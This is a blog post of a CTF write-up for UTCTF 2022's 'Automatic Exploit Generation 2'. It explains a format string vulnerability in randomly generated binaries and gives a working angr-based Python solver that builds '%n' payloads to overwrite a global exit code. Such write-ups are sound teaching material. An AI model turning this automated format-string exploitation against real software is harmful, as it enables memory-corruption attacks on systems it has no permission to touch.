<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer-when-downgrade">

    <title>Automatic Exploit Generation 2</title>
    <meta name="description" content="">

    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
    
    

    <style>
        
        [data-theme="Dark"] {   
            --background-color: #2D283E;
            --background-alt-color: #36304B;
            --highlight-color: #DEC1FF;
            --highlight-color-alt: #ED254E;
            --foreground-color: #D1D7E0;
        }
        
        [data-theme="Light"] {   
            --background-color: #E0F5CC;
            --background-alt-color: #EAF8DD;
            --highlight-color: #D8315B;
            --highlight-color-alt: #0197F6;
            --foreground-color: #3B413C;
        }
        
    </style>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
    
    
</head>
<body data-theme="dark">
    <script defer>

        function setTheme(theme) {
            document.body.dataset['theme'] = theme;
            localStorage.setItem('theme', theme);
        }
        window.addEventListener('storage', function(event){
            if (event.storageArea === localStorage && event.key === "theme") {
                setTheme(event.newValue);
            }
        }, false);
        setTheme(localStorage.getItem('theme') || 'dark');
        setTimeout(() => window.document.body.classList.add("transition"), 300);
    </script>
    <a class="skip-main" href="#main">Skip to content</a>
    <div class="container">
        <header> 
            <h1 class="site-header">
                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
            </h1>
            <nav>
                
                
                
                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
                
                
                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
                
<!--                 <div class="search-container">
                    <input id="search" type="search" placeholder="üßê Search!">

                    <div class="search-results">
                        <div class="search-results__items"></div>
                    </div>
                </div> -->
                
            </nav>
        </header>
        <main id="main" tabindex="-1">
            


<nav class="toc">
  <ul>
  
  </ul>
  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
  </svg>
</nav>

<article class="post">
    <header>
        <h1>Automatic Exploit Generation 2</h1>
    </header>

    <div class="content">
        <pre style="background-color:#212733;color:#ccc9c2;"><code><span>Now with printf!
</span><span>
</span><span>By Tristan (@trab on discord)
</span><span>nc pwn.utctf.live 5002
</span></code></pre>
<p><a href="/utctf-2022/bins/aeg1">binary 1</a></p>
<p><img src="/uctf-2022/angr_simp.png" alt="" /></p>
<p>I really like automatic exploit generation. I did the one in last year's UTCTF and in general they are some of my favorite challenges. So of course as soon as I heard there was one here I went straight for it.</p>
<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>‚ùØ  nc pwn.utctf.live 5002
</span><span>You will be given 10 randomly generated binaries.
</span><span>You have 60 seconds to solve each one.
</span><span>Solve the binary by making it exit with the given exit code
</span><span>Press enter when you&#39;re ready for the first binary.
</span><span>...xxd blob
</span><span>
</span><span>Binary should exit with code 230
</span></code></pre>
<p>The first step is to scope out the provided binary. What's the general sort of attack we're doing, how do different binaries differ, etc.</p>
<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
</span><span>
</span><span>{
</span><span>  </span><span style="color:#ffa759;">long</span><span> lVar1</span><span style="color:#ccc9c2cc;">;
</span><span>  undefined8 </span><span style="color:#f29e74;">*</span><span>puVar2</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
</span><span>  undefined8 local_218</span><span style="color:#ccc9c2cc;">;
</span><span>  undefined8 local_210</span><span style="color:#ccc9c2cc;">;
</span><span>  undefined8 local_208 [</span><span style="color:#ffcc66;">63</span><span>]</span><span style="color:#ccc9c2cc;">;
</span><span>  undefined8 local_10</span><span style="color:#ccc9c2cc;">;
</span><span>  
</span><span>  local_10 </span><span style="color:#f29e74;">= *</span><span>(undefined8 </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
</span><span>  local_218 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span>  local_210 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span>  puVar2 </span><span style="color:#f29e74;">=</span><span> local_208</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffa759;">for </span><span>(lVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x3e</span><span style="color:#ccc9c2cc;">;</span><span> lVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;</span><span> lVar1 </span><span style="color:#f29e74;">=</span><span> lVar1 </span><span style="color:#f29e74;">+ -</span><span style="color:#ffcc66;">1</span><span>) {
</span><span>    </span><span style="color:#f29e74;">*</span><span>puVar2 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span>    puVar2 </span><span style="color:#f29e74;">=</span><span> puVar2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
</span><span>  }
</span><span>  </span><span style="color:#f29e74;">*</span><span>(undefined2 </span><span style="color:#f29e74;">*</span><span>)puVar2 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#f28779;">fgets</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>local_218</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x202</span><span style="color:#ccc9c2cc;">,</span><span>stdin)</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffd580;">permute</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>local_218)</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#f28779;">printf</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>local_218)</span><span style="color:#ccc9c2cc;">;
</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
</span><span>  </span><span style="color:#f28779;">exit</span><span>(exit_code)</span><span style="color:#ccc9c2cc;">;
</span><span>}
</span></code></pre>
<p>It's a pretty clear format string vulnerability and it exits using a global variable "exit_code" as an argument.</p>
<p><img src="/utctf-2022/aeg_checksec.png" alt="checksec of an aeg binary; no PIE" /></p>
<p>There isn't even PIE, so with stack control and a format string vulnerability it should be pretty straightforward to use %n to write whatever we want to exit_code.</p>
<p>Unfortunately...</p>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>void permute(undefined8 param_1)
</span><span>
</span><span>{
</span><span>  permute5(param_1);
</span><span>  permute3(param_1);
</span><span>  permute6(param_1);
</span><span>  permute1(param_1);
</span><span>  permute4(param_1);
</span><span>  permute7(param_1);
</span><span>  permute2(param_1);
</span><span>  permute8(param_1);
</span><span>  return;
</span><span>}
</span></code></pre>
<p>Any input we provide gets shuffled up so what gets passed to printf is completely different than what gets provided via stdin. A quick check of a new binary shows that this all gets shuffled about when a new binary is generated. How do we resolve this?</p>
<p>Well I hate work so I just used angr to magic up a solution lol. All you need to do to solve this is make a format string payload, explore to find a state at the printf invocation, apply some constraints on memory, and then boom you can just ask for the stdin that fits those constraints. It's really quite disgusting that it's this easy.</p>
<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>angr</span><span style="color:#ccc9c2cc;">, </span><span>argparse
</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span style="color:#ffa759;">from </span><span>claripy </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span style="color:#ffa759;">import </span><span>os
</span><span style="color:#ffa759;">from </span><span>subprocess </span><span style="color:#ffa759;">import </span><span>check_output
</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span>
</span><span>r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;pwn.utctf.live&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5002</span><span>)
</span><span>
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>()
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;binary.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">10</span><span>):
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;trying round </span><span>{i}</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>    </span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;tmp.xxd&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;wb&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
</span><span>        f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp tmp.xxd &gt; binary.tmp&quot;</span><span>)
</span><span>
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Binary should exit with code &quot;</span><span>)
</span><span>    exit_code </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>())
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;attempting to call exit(</span><span>{exit_code}</span><span style="color:#bae67e;">)&quot;</span><span>)
</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./binary.tmp&quot;</span><span>)
</span><span>    p </span><span style="color:#f29e74;">= </span><span>angr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Project</span><span>(</span><span style="color:#bae67e;">&quot;./binary.tmp&quot;</span><span>)
</span><span>
</span><span>    state </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">blank_state</span><span>()
</span><span>    simgr </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">simgr</span><span>(state</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">save_unconstrained</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)
</span><span>
</span><span>
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># lmao this is genuinely disgusting
</span><span>    printf_caller_addr </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(</span><span style="color:#ffd580;">check_output</span><span>(</span><span style="color:#bae67e;">&quot;objdump -Mintel -D ./binary.tmp | rg </span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">call.*?printf@plt</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">shell</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">lstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&quot;:&quot;</span><span>)[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span>)
</span><span>
</span><span>
</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span>{exit_code}</span><span style="color:#bae67e;">c%10$n</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;
</span><span>    simgr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">explore</span><span>(</span><span style="color:#ffcc66;">find</span><span style="color:#f29e74;">=</span><span>printf_caller_addr)
</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span>simgr</span><span style="color:#f29e74;">.</span><span>found:
</span><span>        i</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_constraints</span><span>(i</span><span style="color:#f29e74;">.</span><span>memory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">load</span><span>(i</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>rdi</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f28779;">len</span><span>(payload)) </span><span style="color:#f29e74;">== </span><span>payload)
</span><span>        i</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_constraints</span><span>(i</span><span style="color:#f29e74;">.</span><span>memory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">load</span><span>(i</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>rdi</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">8</span><span>) </span><span style="color:#f29e74;">== </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;exit_code&#39;</span><span>]))
</span><span>        </span><span style="color:#ffa759;">if </span><span>i</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">satisfiable</span><span>():
</span><span>            log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;sat!&quot;</span><span>)
</span><span>        </span><span style="color:#ffa759;">else</span><span>:
</span><span>            log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">error</span><span>(</span><span style="color:#bae67e;">&quot;oop not sat :(&quot;</span><span>)
</span><span>            </span><span style="color:#ffd580;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
</span><span>
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(i</span><span style="color:#f29e74;">.</span><span>posix</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(</span><span style="color:#ffcc66;">0</span><span>))
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{exit_code}</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span></code></pre>
<p>I went to run it on the server... only to find that it took too long. Averaged something like 80 seconds on my laptop and the server times out at 60 seconds per binary. I was a little scared that I wouldn't be able to get it fast enough to solve but a little investigation found the tip "Use pypy.  pypy is an alternate python interpreter that performs optimized jitting of python code." I tried running it with pypy and sure enough it cut my average execution time to 40 seconds, comfortably fast enough to solve it.</p>
<p>utflag{you_mix_me_right_round_baby_right_round135799835}</p>

    </div>

    
    <div class="article-info">
        
        <div class="article-date">13 March 2022</div>
        
        <div class="article-taxonomies">
            
            
                <ul class="article-tags">
                    
                    <li><a href="https://tsheinen.github.io/tags/pwn/">#pwn</a></li>
                    
                    <li><a href="https://tsheinen.github.io/tags/automatic-exploit-gen/">#automatic-exploit-gen</a></li>
                    
                </ul>
            
        </div>
    </div>

</article>

<script>
window.onscroll = function() {
    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
        var count = 200;
        var defaults = {
          origin: { y: 0.7 }
        };

        function fire(particleRatio, opts) {
          confetti(Object.assign({}, defaults, opts, {
            particleCount: Math.floor(count * particleRatio)
          }));
        }

        fire(0.25, {
          spread: 26,
          startVelocity: 55,
        });
        fire(0.2, {
          spread: 60,
        });
        fire(0.35, {
          spread: 100,
          decay: 0.91,
          scalar: 0.8
        });
        fire(0.1, {
          spread: 120,
          startVelocity: 25,
          decay: 0.92,
          scalar: 1.2
        });
        fire(0.1, {
          spread: 120,
          startVelocity: 45,
        });
    }
}
</script>
<script type="text/javascript" src="/js/navbar.js"></script>


        </main>
        <footer>
            
            
        </footer>
    </div>



    <details data-popover="up" style="right: 20px;top: 20px;">
      <summary>
		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
      </summary>
      <div class="swatch-container">
          
            <div class="swatch-child" onclick="setTheme('Dark')">
                <div style="text-align: center;">
                  <div data-theme=Dark class="swatch">
                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
                  </div>
                  <span style="color:  var(--background-color, #000000)"> Dark </span>
              </div>
            </div>
          
            <div class="swatch-child" onclick="setTheme('Light')">
                <div style="text-align: center;">
                  <div data-theme=Light class="swatch">
                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
                  </div>
                  <span style="color:  var(--background-color, #000000)"> Light </span>
              </div>
            </div>
          
      </div>
    </details>

    <!-- Cloudflare Web Analytics -->
    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
    <!-- End Cloudflare Web Analytics -->

    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
</body>
</html>
